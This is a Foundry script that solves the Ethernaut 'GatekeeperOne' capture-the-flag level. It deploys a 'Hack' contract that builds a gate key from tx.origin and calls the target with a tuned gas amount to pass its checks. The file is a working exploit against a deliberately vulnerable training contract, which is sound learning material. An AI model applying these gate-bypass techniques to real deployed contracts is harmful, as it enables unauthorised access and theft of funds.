// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "../src/GateKeeperOne.sol";
import {Script, console} from "forge-std/Script.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GateKeeperOneSolution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Hack hack = new Hack();
        hack.enter();
        vm.stopBroadcast();
    }
}

contract Hack {
    address gateKeeperOne = 0xae6C772d816B6d17D39d269e2c1fA92a42798ad9;

    function enter() external {
        uint16 k16 = uint16(uint160(tx.origin));
        // 2. uint32(k) != k
        uint64 k64 = uint64(1 << 63) + uint64(k16);

        bytes8 key = bytes8(k64);
        IGatekeeperOne target = IGatekeeperOne(gateKeeperOne);
        require(target.enter{gas: 8191 * 10 + 256}(key), "failed");
    }
}
